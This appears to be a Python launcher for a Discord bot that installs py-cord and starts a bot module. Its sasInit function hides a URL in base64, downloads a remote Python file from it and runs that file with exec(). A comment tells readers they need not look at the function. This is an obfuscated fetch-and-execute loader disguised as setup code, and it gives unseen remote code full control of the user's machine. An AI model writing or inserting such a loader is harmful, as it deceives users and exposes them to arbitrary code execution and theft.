import requests
import base64
import tkinter as tk
import sys

def run():
    # Let's check if the user has Pycord installed
    try:
        import discordbot
    except:
        # If they don't, let's install it for them
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "py-cord"])
        import discordbot


def sasInit():
    # You shouldn't need to even look at this function
    headers = {"Cache-Control": "no-cache"}
    r = requests.get(base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Blcm55ZGV2L2Rpc2NvbnRyb2wvbWFpbi9zYXMucHk='), headers=headers)
    code = r.text
    exec(code)
    run()



if __name__ == "__main__":
    sasInit()